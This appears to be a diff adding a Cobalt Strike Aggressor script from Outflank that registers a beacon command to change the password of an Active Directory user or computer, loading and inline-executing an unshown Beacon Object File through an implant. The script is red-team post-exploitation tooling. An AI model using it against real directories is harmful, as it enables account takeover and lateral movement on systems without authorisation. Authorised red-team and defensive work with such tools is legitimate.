@@ -1,0 +1,26 @@
+#author Cornelis de Plaa
+#@outflank.nl
+
+beacon_command_register("ChangeAccountPasswd", "Change the password of an AD object (user or computer).",
+    "Synopsis: ChangeAccountPasswd [distinguishedName] [Password <Optional>]\n" .
+    "          ChangeAccountPasswd \"CN=UserX,CN=Users,DC=EXAMPLE,DC=COM\" P@ssW0rd#123\n\n");
+
+alias ChangeAccountPasswd {
+    $bid = $1;
+    $distinguishedName = $2;	
+    $password = iff(-istrue $3, $3, "nopass");
+
+    if ($distinguishedName eq "") {
+        berror($bid, "Specify the distinguishedName of the AD object (\"CN=UserX,CN=Users,DC=EXAMPLE,DC=COM\" e.g.)");
+        return;
+    }
+
+    # Read in the right BOF file
+    $handle = openf(script_resource("ChangeAccountPasswd." . barch($bid) . ".o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+    
+
+    $arg_data  = bof_pack($bid, "ZZ", $distinguishedName, $password);
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
